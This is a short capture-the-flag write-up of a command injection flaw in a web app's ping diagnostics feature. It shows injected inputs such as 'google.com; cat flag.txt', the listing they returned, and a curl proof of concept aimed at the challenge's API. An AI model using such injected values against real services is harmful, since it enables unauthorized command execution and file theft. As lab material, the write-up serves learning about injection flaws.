# Vulnerability

Shell being enabled for user input that enables user to use RCE to attack service. 

# Extraction

In Network / Diagnostics tab I found out that every target host given will be pinged just by attaching its address at the end of `ping -c 2` and generates output like this:

```
$ ping -c 2 this is a test
```

So I found out that I can check if shell is enabled and so I can inject Command into it if it does not protect it, like this:

**Input** : 
```
google.com; ls
```

**Output** :
```
$ ping -c 2 google.com; ls
config
ctfapp
db
flag.txt
manage.py
manage.pyc
reports
requirements.txt
static
staticfiles
templates
```

found the target file: `flag.txt` and opened it using cat with this input `google.com; cat flag.txt` and the flag obtained. 

# PoC

```
curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" -d '{"host":"google.com; cat flag.txt"}'
```